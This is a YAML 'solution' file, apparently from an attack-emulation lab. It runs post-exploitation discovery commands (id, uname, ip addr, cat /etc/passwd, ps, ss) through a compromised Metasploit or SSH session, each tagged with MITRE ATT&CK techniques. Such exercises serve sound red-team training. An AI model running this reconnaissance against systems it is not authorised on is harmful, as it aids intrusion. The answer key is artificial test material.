# Phase 7 SOLUTION: Discovery - Basic System Information
#
# Runs a set of standard post-exploitation discovery commands via the active session.
# Works with both Metasploit shell sessions (msf-session) and SSH sessions (ssh).
#
# Variables required: $SESSION_NAME
# ATT&CK: T1082, T1087.001, T1057, T1016, T1049

commands:
  - type: debug
    cmd: "Running discovery on $TARGET via session $SESSION_NAME..."

  # Confirm current user and effective privilege level
  - type: msf-session
    session: $SESSION_NAME
    cmd: id
    metadata:
      tactic: "TA0007"
      technique: "T1082"
      technique_name: "System Information Discovery"

  # Identify the machine name
  - type: msf-session
    session: $SESSION_NAME
    cmd: hostname
    metadata:
      tactic: "TA0007"
      technique: "T1082"
      technique_name: "System Information Discovery"

  # Get the kernel version and architecture
  - type: msf-session
    session: $SESSION_NAME
    cmd: uname -a
    metadata:
      tactic: "TA0007"
      technique: "T1082"
      technique_name: "System Information Discovery"

  # List network interfaces and IP addresses
  - type: msf-session
    session: $SESSION_NAME
    cmd: ip addr show
    metadata:
      tactic: "TA0007"
      technique: "T1016"
      technique_name: "System Network Configuration Discovery"

  # Enumerate local accounts
  - type: msf-session
    session: $SESSION_NAME
    cmd: cat /etc/passwd
    metadata:
      tactic: "TA0007"
      technique: "T1087.001"
      technique_name: "Account Discovery: Local Account"

  # List running processes
  - type: msf-session
    session: $SESSION_NAME
    cmd: ps aux
    metadata:
      tactic: "TA0007"
      technique: "T1057"
      technique_name: "Process Discovery"

  # Show active network connections
  - type: msf-session
    session: $SESSION_NAME
    cmd: ss -tn
    metadata:
      tactic: "TA0007"
      technique: "T1049"
      technique_name: "System Network Connections Discovery"
